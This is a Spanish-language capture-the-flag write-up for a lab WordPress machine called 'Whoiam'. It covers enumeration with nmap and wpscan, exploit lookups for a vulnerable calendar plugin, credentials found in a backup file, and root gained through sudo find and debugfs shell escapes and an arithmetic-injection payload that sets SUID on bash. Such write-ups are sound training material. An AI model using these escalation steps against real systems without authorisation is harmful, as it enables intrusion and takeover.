# Whoiam
## Reconocimiento
### Nmap
En primer lugar llevo a cabo un escaneo de puertos con el objetivo de identificar los servicios activos y los puertos en los que están corriendo.
```bash
❯ nmap -p 0-65535 --open -T5 -A -sT -Pn -n 172.19.0.2 -oX nmapScan.xml && xsltproc nmapScan.xml -o nmapScan.html && open nmapScan.html &>/dev/null & disown
```

![[Ciberseguridad/CTFs/253_septiembre/15-whoiam/imgs/nmap.png]]

Se trata de un servidor HTTP sirviendo una página hecha en WordPress 6.5.4, al visitarla, me encuentro con esto

![[whoiam.png]]

No hay nada más a parte de eso y el botón no lleva ningún enlace, así que lo siguiente va a ser hacer fuzzing y utilizar `whatweb` para recavar más información y encontrar un punto de entrada.
El fuzzing revela básicamente los archivos típicos de un sitio de wordpress, nada fuera de lo usual, y `whatweb` tampoco saca nada especialmente interesante que no tuviera ya gracias al escaneo de puertos.
Lo lógico ahora es usar `wpscan` para obtener más información sobre la web
```SHELL
❯ wpscan --url http://172.19.0.2/ -e u, vp, vt --api-token 0000000000000000000000000000
```
El escaneo revela varias vulnerabilidades que no estoy seguro de que vayan a serme útiles y dos usernames: `erik` y `developer`. Voy a probar a hacer ataques de diccionario a ambos usuarios usando la misma herramienta, a ver si dan resultado.
Cuando veo que no funciona el ataque me doy cuenta de que no he enumerado bien con `wpscan`, lanzo el comando de nuevo corregido.
```shell
❯ wpscan --url http://172.19.0.2/ -e p --api-token 0000000000000000000000000000
```

El escaneo bien configurado revela un plugin con un más que amplio historial de vulnerabilidades que puedo explotar. Hago uso de `searchsploit` y después de Metasploit para utilizar el exploit en la página.

```shell
❯ searchsploit modern events calendar lite
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
Wordpress Plugin Modern Events Calendar 5.16.2 - Event export (Unauthenticated)                     | php/webapps/50084.py
Wordpress Plugin Modern Events Calendar 5.16.2 - Remote Code Execution (Authenticated)              | php/webapps/50082.py
WordPress Plugin Modern Events Calendar V 6.1 - SQL Injection (Unauthenticated)                     | php/webapps/50687.py
❯ msfdb run
msf6 > search modern calendar
Matching Modules
================

   #  Name                                                     Disclosure Date  Rank       Check  Description
   -  ----                                                     ---------------  ----       -----  -----------
   0  auxiliary/scanner/http/wp_modern_events_calendar_sqli    2021-12-13       normal     Yes    WordPress Modern Events Calendar SQLi Scanner
   1  exploit/multi/http/wp_plugin_modern_events_calendar_rce  2021-01-29       excellent  Yes    Wordpress Plugin Modern Events Calendar - Authenticated Remote Code Execution
msf6 > use 1
```

En este caso voy a usar el exploit de index 0, así que lanzo `use 0` y después `options` para configurar los parámetros del exploit.
Después de probar ambos exploit veo que ninguno funciona, el 0 se queda atascado y el 1 requiere la contraseña del administrador (quizá sea útil más adelante).
Voy a lanzar un fuzzing de nuevo por si me hubiera dejado algo interesante.
Encuentro una ruta que había pasado por alto pero que tiene un archivo muy interesante, se trata de `/backup`, al visitarla esto es lo que hay

![[backup.png]]

## Explotación
Bajo el archivo, lo descomprimo y un cat revela que el contenido son las credenciales de developer y su password.

![[unzip.png]]

Se me ocurre que se podría probar de nuevo el exploit que requería contraseña, ya que ahora sí la tengo. 

![[adminadmin.png]]

Me estaba dando problemas entrar como `developer` así que creé un usuario y conseguí entrar.

## Post-explotación
Al entrar como `www-data` y hacer `sudo -l`, veo que puedo ejecutar `find` como el usuario `rafa`, y pivoto fácilmente con
```
sudo -u rafa find . -exev /bin/sh \;quit
```

![[rafa.png]]

Ya autenticado como rafa, al hacer `sudo -l` de nuevo veo que es posible pivotar a `ruben` haciendo uso del binario `debugfs`.
```
sudo -u ruben debugfs
!/bin/bash
```

![[penguinsh.png]]

Una vez estoy dentro como ruben, al hacer `sudo -l` veo que puedo ejecutar bash en un script alojado en `/opt`, al hacerle un cat vep su contenido:
```
cat penguin.sh
#!/bin/bash

read -rp "Enter guess: " num

if [[ $num -eq 42 ]]
then
  echo "Correct"
else
  echo "Wrong"
fi
```

El código da como valor correcto el input `42`, entonces, con la siguiente línea se "engaña" al código para añadir el bit SUID al binario bash, permitiendo que si cualquier usuario lo ejecuta con el parámetro `-p` herede los permisos del dueño, es decir, `root`.
```
sum[$(chmod u+s /bin/bash >&2)]+42
```


![[Ciberseguridad/CTFs/253_septiembre/15-whoiam/imgs/root.png]]